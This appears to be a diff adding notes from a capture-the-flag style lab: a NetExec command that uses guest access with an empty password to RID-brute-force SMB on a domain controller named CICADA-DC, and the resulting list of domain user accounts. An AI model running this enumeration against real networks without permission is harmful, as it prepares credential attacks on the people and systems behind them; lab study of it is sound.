@@ -1,0 +1,10 @@
+nxc smb 10.10.11.35 -u "guest" -p "" --rid-brute | grep "SidTypeUser"
+SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
